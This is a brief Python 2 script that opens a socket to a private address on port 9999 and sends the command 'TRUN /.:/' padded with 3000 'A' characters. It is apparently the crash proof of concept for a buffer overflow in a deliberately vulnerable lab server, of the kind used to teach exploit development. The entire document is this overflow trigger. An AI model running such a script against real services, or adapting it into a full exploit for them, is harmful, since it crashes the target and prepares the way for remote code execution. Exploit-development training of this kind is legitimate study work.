import sys, socket

buff = "TRUN /.:/"

buff += "A" * 3000

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.0.0.25',9999))

print s.recv(1024)

s.send(buff)

s.close()
